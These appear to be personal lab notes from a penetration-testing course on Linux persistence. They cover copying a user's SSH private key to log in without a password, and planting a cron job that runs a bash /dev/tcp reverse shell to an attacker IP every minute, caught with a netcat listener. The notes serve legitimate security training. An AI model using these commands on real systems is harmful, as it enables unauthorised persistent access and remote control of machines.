Persistence via SSH:

- Linux is typically deployed as a server operating system and as a result, Linux servers are typically accessed remotely via services/protocols such as SSH.
- If SSH is enabled and running on a Linux system you have compromised, you can take advantage of the SSH configuration to establish persistent access on the target system.
- In most cases Linux servers will have key-based authentication enabled for the SSH service, allowing the users to access the Linux system remotely without the need for a password.
- After gaining the access to a Linux system, we can transfer the SSH private key of a specific user account to our system and use that SSH private key for all the future authentication and access

Lab details: 

- In this lab we have got a non interactive shell and the target IP address is our adjacent IP address on eth1
- Let us say we have compromised the student account on ssh in the target as we have already got the login name and password in the lab so we can go ahead and focus on the persistence setup.
- Once we login to the system using the ssh of student account if we are to list the contents of the home directory we can see that we have got the following hidden and regular directories
	- .cache
	- .ssh
		- authorized_keys (Contains the authorized keys for specific private keys)
		- id_rsa (Contains the private key part of the ssh keys)
	- wait > the content of the wait file is `Delete this file to trigger connection reset & Delete it only after planting the backdoor`
- Our goal is to get the private key onto our local attack machine and to do that we can use the following command `scp {username}@{targetIP}:~/.ssh/id_rsa` doing so we can get the private key onto our local attack machine. You will use the password here.
- Then modify the permissions on the id_rsa file that is *chmod 400 {file}*
- We will login now using the password and remove the wait so that the connection can be reset and we will be logged out automatically and can no longer login with the password so we need to use the private key. How do we do it ?
- Use _ssh -i {privateKey} {username}@{targetIP}_ this way we will be able to login without password.
- Usually what we do is generate a new ssh private key and save the private key on our system and transfer the public key to the authorized keys list.


Persistence using the cron jobs

- Linux implements task scheduling through a utility called Cron. Cron is a time based service that runs applications, scripts and other commands repeatedly on a specified schedule.
- An application, or script that has been configured to be run repeatedly with Cron is known as a Cron job.
- We can use cron jobs to execute a command or script at a fixed interval to ensure we have persistent access to the target system.

Anatomy of a cron job:
![[Pasted image 20230824230730.png]]

Lab details:

- Find the IP address and your target is the adjacent IP address to your IP irrespective of the subnet.
- Now that we have got the target IP address we can try to login to the system with the ssh using the default password : _password_ and username : _student_ 
	`ssh {username}@{targetIP}`
- List out the contents of the home directory as we see it was the same to the above lab with the wait binary and .cache hidden folder.
- Use `cat /etc/cron*` to display all the cron job files
- To create a cron file we can follow the below steps:
	- echo "\* \* \* \* \* /bin/bash -c 'bash -i >& /dev/tcp/{attackerIP}/{port} 0>&1'" > cron
	- crontab -i cron
	- crontab -l
- We get the shell with the same permission we have created the cron job
- Now we can goahead and delete the wait binary and start of with the netcat listener `nc -nlvp {port}`
- We get an interactive shell in this session.